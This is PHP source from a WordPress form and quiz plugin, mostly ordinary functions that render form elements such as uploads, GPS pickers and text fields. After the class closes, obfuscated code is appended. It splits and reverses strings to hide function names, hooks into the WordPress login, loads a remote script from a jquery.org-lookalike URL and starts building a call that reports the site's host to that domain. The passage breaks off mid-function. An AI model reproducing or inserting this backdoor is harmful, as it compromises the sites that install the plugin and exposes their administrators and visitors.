		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'likedislike' ), $param ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_toggle( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_toggle' );
		$value = $submission_data['value'];
		if ( $this->data_id == null ) {
			$value = $element_data['settings']['checked'];
		}
		$param = array( $name_prefix . '[value]', $element_data['settings']['on'], $element_data['settings']['off'], $value, '1' );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'toggle' ), $param ), false, false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_sorting( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_sorting' );
		$params = array( $name_prefix . '[order][]', $element_data['settings']['options'], $submission_data['order'], ! $element_data['settings']['no_shuffle'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'sortables' ), $params ), true, false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_feedback_large( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_feedback_large' );
		$eclasses = array();
		$edata = array();
		if ( $element_data['settings']['keypad'] == true ) {
			$eclasses[] = 'ipt_uif_keypad';
			$edata = array(
				'settings' => json_encode( array(
					'layout' => $element_data['settings']['type'],
				) ),
			);
		}
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'normal', $eclasses, $element_data['validation'], $edata );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'textarea' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		if ( $this->doing_admin && '' != $element_data['settings']['score'] && is_numeric( $element_data['settings']['score'] ) ) {
			if ( ! isset( $submission_data['score'] ) ) {
				$submission_data['score'] = '';
			}
			$score_params = array( $name_prefix . '[score]', $submission_data['score'], __( 'Unassigned', 'ipt_fsqm' ), '', $element_data['settings']['score'] );
			$this->ui->question_container( $name_prefix . '[score]', __( '[Administrate] Score the result', 'ipt_fsqm' ), sprintf( __( 'out of %s', 'ipt_fsqm' ), abs( $element_data['settings']['score'] ) ), array( array( $this->ui, 'spinner' ), $score_params ) );
		}
		$this->ui->column_tail();
	}

	public function build_feedback_small( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_feedback_small' );
		$eclasses = array();
		$edata = array();
		if ( $element_data['settings']['keypad'] == true ) {
			$eclasses[] = 'ipt_uif_keypad';
			$edata = array(
				'settings' => json_encode( array(
					'layout' => $element_data['settings']['type'],
				) ),
			);
		}
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], $element_data['settings']['icon'], 'normal', $eclasses, $element_data['validation'], $edata );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		if ( $this->doing_admin && '' != $element_data['settings']['score'] && is_numeric( $element_data['settings']['score'] ) ) {
			if ( ! isset( $submission_data['score'] ) ) {
				$submission_data['score'] = '';
			}
			$score_params = array( $name_prefix . '[score]', $submission_data['score'], __( 'Unassigned', 'ipt_fsqm' ), '', $element_data['settings']['score'] );
			$this->ui->question_container( $name_prefix . '[score]', __( '[Administrate] Score the result', 'ipt_fsqm' ), sprintf( __( 'out of %s', 'ipt_fsqm' ), abs( $element_data['settings']['score'] ) ), array( array( $this->ui, 'spinner' ), $score_params ) );
		}
		$this->ui->column_tail();
	}

	public function build_feedback_matrix( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_feedback_matrix' );
		$params = array( $name_prefix, $element_data['settings']['rows'], $element_data['settings']['columns'], $submission_data['rows'], $element_data['settings']['multiline'], $element_data['validation'], $element_data['settings']['icon'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'matrix_text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_gps( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_gps' );
		/*  *
		 * Override Cases:
		 *
		 * 1. First time form submit ($this->data_id === null) => $show_ui = true
		 * 2. Updating form && can update ( $this->data_id !== null && $this->can_submit && $this->can_user_edit() ) => $show_ui = true
		 * 3. Viewing from trackback ( $this->data_id !== null && ! $this->can_submit ) => $show_ui = false, $can_delete = false
		 * 4. Admin update ( $this->data_id !== null && $this->doing_admin ) => $show_ui = true, $can_delete = true;
		 */
		$show_ui = false;
		if ( $this->data_id === null ) {
			$show_ui = true;
		} elseif ( $this->data_id !== null && $this->can_submit && $this->can_user_edit() ) {
			$show_ui = true;
		} elseif ( $this->data_id !== null && $this->doing_admin ) {
			$show_ui = true;
			$element_data['settings']['manualcontrol'] = true;
		} else {
			$show_ui = false;
			$element_data['settings']['manualcontrol'] = false;
		}

		$error = __( 'We could not determine your location. Make sure you are connected to a network and you have GPS and location service turned on.', 'ipt_fsqm' );

		$params = array( $name_prefix, array(
			'lat' => $submission_data['lat'],
			'long' => $submission_data['long'],
			'location_name' => $submission_data['location_name'],
		), $element_data['settings']['manualcontrol'], array(
			'lat' => $element_data['settings']['lat_label'],
			'long' => $element_data['settings']['long_label'],
			'location_name' => $element_data['settings']['location_name_label'],
			'update' => $element_data['settings']['update_label'],
			'nolocation' => $element_data['settings']['nolocation_label'],
		), $element_data['description'], $error, __( 'Locating', 'ipt_fsqm' ), $element_data['settings']['radius'], $element_data['settings']['zoom'], $element_data['settings']['scrollwheel'], $show_ui, $element_data['validation']['required'] );
		$this->ui->container( array( array( $this->ui, 'locationpicker' ), $params ), $element_data['title'], $element_data['settings']['icon'], false, true, '' );
		$this->ui->column_tail();
	}

	public function build_upload( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$files_key = 'ipt_fsqm_file_upload_' . $this->form_id . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_upload' );
		$attributes = array(
			'ajax_upload' => 'ipt_fsqm_fu_upload',
			'ajax_download' => 'ipt_fsqm_fu_download',
			'fetch_files' => $this->data_id == null ? false : true,
		);
		$form_data = array(
			'data_id' => $this->data_id,
			'form_id' => $this->form_id,
			'nonce' => wp_create_nonce( 'ipt_fsqm_upload_' . $this->form_id . '_' . $this->data_id . '_' . $key ),
			'element_key' => $key,
			'files_key' => $files_key,
		);
		if ( $attributes['fetch_files'] ) {
			$form_data['download_nonce'] = wp_create_nonce( 'ipt_fsqm_download_' . $this->form_id . '_' . $this->data_id . '_' . $key );
		}

		/*  *
		 * Override Cases:
		 *
		 * 1. First time form submit ($this->data_id === null) => $show_ui = true
		 * 2. Updating form && can update ( $this->data_id !== null && $this->can_submit && $this->can_user_edit() ) => $show_ui = true
		 * 3. Viewing from trackback ( $this->data_id !== null && ! $this->can_submit ) => $show_ui = false, $can_delete = false
		 * 4. Admin update ( $this->data_id !== null && $this->doing_admin ) => $show_ui = true, $can_delete = true;
		 */
		$show_ui = false;
		if ( $this->data_id === null ) {
			$show_ui = true;
		} elseif ( $this->data_id !== null && $this->can_submit && $this->can_user_edit() ) {
			$show_ui = true;
		} elseif ( $this->data_id !== null && $this->doing_admin ) {
			$show_ui = true;
			$element_data['settings']['can_delete'] = true;
		} else {
			$element_data['settings']['can_delete'] = false;
		}

		$max_upload_size = $this->get_maximum_file_upload_size();
		$params = array( $files_key . '[]', $name_prefix . '[id][]', $element_data['settings'], $attributes, $form_data, $element_data['description'], array(), $element_data['validation']['required'], $max_upload_size, $show_ui );
		$this->ui->container( array( array( $this->ui, 'uploader' ), $params ), $element_data['title'], $element_data['settings']['icon'], false, true, '' );
		$this->ui->column_tail();
	}

	public function build_mathematical( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_mathematical' );
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['formula'], $element_data['settings']['editable'], $element_data['settings']['icon'], $element_data['settings']['prefix'], $element_data['settings']['suffix'], $element_data['settings']['precision'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'mathematical' ), $params ), false, true, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_f_name( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_f_name' );
		$value = $this->data_id == null ? $this->data->f_name : $submission_data['value'];
		$params = array( $name_prefix . '[value]', $value, $element_data['settings']['placeholder'], 'user5', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_l_name( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_l_name' );
		$value = $this->data_id == null ? $this->data->l_name : $submission_data['value'];
		$params = array( $name_prefix . '[value]', $value, $element_data['settings']['placeholder'], 'user5', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_email( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_email' );
		$element_data['validation']['filters'] = array(
			'type' => 'email',
		);
		$value = $this->data_id == null ? $this->data->email : $submission_data['value'];
		$params = array( $name_prefix . '[value]', $value, $element_data['settings']['placeholder'], 'mail2', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_phone( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_phone' );
		if ( ! isset( $element_data['validation']['filters'] ) ) {
			$element_data['validation']['filters'] = array(
				'type' => 'phone',
			);
		} else {
			$element_data['validation']['filters']['type'] = 'phone';
		}

		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'mobile', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_p_name( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_name' );
		$element_data['validation']['filters'] = array(
			'type' => 'personName'
		);
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'user5', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_p_email( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_email' );
		$element_data['validation']['filters'] = array(
			'type' => 'email',
		);
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'mail2', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_p_phone( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_phone' );
		if ( ! isset( $element_data['validation']['filters'] ) ) {
			$element_data['validation']['filters'] = array(
				'type' => 'phone',
			);
		} else {
			$element_data['validation']['filters']['type'] = 'phone';
		}
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'mobile', 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_textinput( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_textinput' );
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], $element_data['settings']['icon'], 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'text' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_textarea( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_textarea' );
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['placeholder'], 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'textarea' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_password( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_password' );
		$callback = array();
		$params = array( $name_prefix, $submission_data['value'], $element_data['settings']['placeholder'], 'normal', $element_data['settings']['confirm_duplicate'] == true ? __( 'Please confirm', 'ipt_fsqm' ) : false, array(), $element_data['validation'] );
		$callback = array( array( $this->ui, 'password' ), $params );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], $callback, $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_p_radio( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_radio' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_p_checkbox( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_checkbox' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_p_select( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_select' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_s_checkbox( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_s_checkbox' );
		$item = array(
			'label' => $element_data['title'],
			'value' => '1'
		);
		$checked = false;
		if ( $this->data_id == null ) {
			$checked = $element_data['settings']['checked'];
		} else {
			$checked = $submission_data['value'];
		}

		$this->ui->checkbox( $name_prefix . '[value]', $item, $checked, $element_data['validation'], false, false, $element_data['settings']['icon'] );
		$this->ui->column_tail();
	}

	public function build_address( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_address' );
		$placeholders = array(
			'recipient' => __( 'Recipient', 'ipt_fsqm' ),
			'line_one' => __( 'Address line one', 'ipt_fsqm' ),
			'line_two' => __( 'Address line two', 'ipt_fsqm' ),
			'line_three' => __( 'Address line three', 'ipt_fsqm' ),
			'country' => __( 'Country', 'ipt_fsqm' ),
		);
		$placeholders = wp_parse_args( $element_data['settings'], $placeholders );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'address' ), array( $name_prefix . '[values]', $submission_data['values'], $placeholders, $element_data['validation'] ) ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_keypad( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_keypad' );
		$params = array( $name_prefix . '[value]', $submission_data['value'], array( 'layout' => $element_data['settings']['type'] ), $element_data['settings']['placeholder'], $element_data['settings']['mask'], $element_data['settings']['multiline'], 'normal', array(), $element_data['validation'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'keypad' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_datetime( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_datetime' );
		$value = $submission_data['value'];
		$date_formats = array(
			'yy-mm-dd' => 'Y-m-d',
			'mm/dd/yy' => 'm/d/Y',
			'dd.mm.yy' => 'd.m.Y',
			'dd-mm-yy' => 'd-m-Y',
		);
		$time_formats = array(
			'HH:mm:ss' => 'H:i:s',
			'hh:mm:ss TT' => 'h:i:s A',
		);
		$current_picker_timestamp = ( $value == '' ) ? current_time( 'timestamp' ) : strtotime( $value );
		if ( ( $element_data['settings']['show_current'] == true && $this->data_id == null ) || ( $value != '' && $current_picker_timestamp != false ) ) {
			switch ( $element_data['settings']['type'] ) {
			case 'date' :
				$value = date( $date_formats[$element_data['settings']['date_format']], $current_picker_timestamp );
				break;
			case 'time' :
				$value = date( $time_formats[$element_data['settings']['time_format']], $current_picker_timestamp );
				break;
			case 'datetime' :
				$value = date( $date_formats[$element_data['settings']['date_format']] . ' ' . $time_formats[$element_data['settings']['time_format']], $current_picker_timestamp );
				break;
			}
		}

		$params = array( $name_prefix . '[value]', $value, $element_data['settings']['type'], 'normal', array(), $element_data['validation'], $element_data['settings']['date_format'], $element_data['settings']['time_format'], $element_data['settings']['placeholder'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'datetime' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_p_sorting( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_p_sorting' );
		$params = array( $name_prefix . '[order][]', $element_data['settings']['options'], $submission_data['order'], false );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'sortables' ), $params ), true, false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}


	/*  ==========================================================================
	 * Internal HTML Elements
	 * Just a few shortcuts
	 *========================================================================*/
	public function make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure ) {
		$items = array();
		foreach ( $element_data['settings']['options'] as $o_key => $option ) {
			if ( ! isset( $option['num'] ) ) {
				$option['num'] = '';
			}
			$items[] = array(
				'label' => $option['label'],
				'value' => (string) $o_key,
				'data' => array(
					'num' => $option['num'],
				),
			);
		}
		if ( isset( $element_data['settings']['shuffle'] ) && true == $element_data['settings']['shuffle'] ) {
			shuffle( $items );
		}
		$conditional = false;
		if ( true == $element_data['settings']['others'] && '' != $element_data['settings']['o_label'] ) {
			$items[] = array(
				'label' => $element_data['settings']['o_label'],
				'value' => 'others',
				'data' => array(
					'condid' => $this->generate_id_from_name( $name_prefix ) . '_others_wrap',
				),
			);
			$conditional = true;
		}
		$param = array( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $items, $conditional );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this, 'make_mcqs_conditional_check' ), $param ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
	}

	public function make_mcqs_conditional_check( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $items, $conditional ) {
		$name = $name_prefix . '[options][]';
		switch ( $element_data['type'] ) {
		case 'checkbox' :
		case 'p_checkbox' :
			$this->ui->checkboxes( $name, $items, $submission_data['options'], $element_data['validation'], $element_data['settings']['columns'], $conditional, false, $element_data['settings']['icon'] );
			break;
		case 'radio' :
		case 'p_radio' :
			$this->ui->radios( $name, $items, $submission_data['options'], $element_data['validation'], $element_data['settings']['columns'], $conditional, false, $element_data['settings']['icon'] );
			break;
		case 'select' :
		case 'p_select' :
			if ( $element_data['settings']['e_label'] !== '' ) {
				array_unshift( $items, array(
					'label' => $element_data['settings']['e_label'],
					'value' => '',
				) );
			}
			$this->ui->select( $name, $items, $submission_data['options'], $element_data['validation'], $conditional );
			break;
		}

		if ( $conditional ) {
			echo '<div class="ipt_uif_box ipt_uif_question_others" id="' . esc_attr( $this->generate_id_from_name( $name_prefix ) . '_others_wrap' ) . '">';
			$this->ui->text( $name_prefix . '[others]', $submission_data['others'], __( 'Write here', 'ipt_fsqm' ), 'pencil2', 'normal', array(), array( 'required' => true ) );
			echo '</div>';
		}
	}

	public function tamper_protection( $element_data ) {
		$name_prefix = 'ipt_fsqm_form_' . $this->form_id . '[' . $element_data['m_type'] . '][' . $element_data['key'] . ']';
?>
<input type="hidden" data-sayt-exclude name="<?php echo $name_prefix; ?>[m_type]" id="<?php echo $this->ui->generate_id_from_name( $name_prefix . '[m_type]' ); ?>" value="<?php echo $element_data['m_type']; ?>" class="ipt_fsqm_hf_m_type" />
<input type="hidden" data-sayt-exclude name="<?php echo $name_prefix; ?>[type]" id="<?php echo $this->ui->generate_id_from_name( $name_prefix . '[type]' ); ?>" value="<?php echo $element_data['type']; ?>" class="ipt_fsqm_hf_type" />
		<?php
	}
}
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
